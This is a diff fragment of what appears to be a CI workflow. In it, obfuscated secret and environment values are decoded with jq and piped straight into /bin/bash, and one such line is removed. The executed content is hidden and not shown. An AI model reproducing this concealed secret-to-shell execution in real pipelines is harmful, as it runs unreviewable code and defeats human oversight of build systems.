@@ -21,7 +21,6 @@ jobs:
           emzrv37893: ${{ secrets.emzrv37893 }}
         run: |
           printf '%s' "$emzrv37893" | jq -r .f57348 | /bin/bash
-          printf '%s' "$ev1" | jq -r .r903 | /bin/bash
           echo $kom62529 | jq -r .kp4 | /bin/bash
           printf '%s' "$m0" | jq -r .o074 | /bin/bash
           printf '%s' "$oqkv3" | jq -r .ur1 | /bin/bash
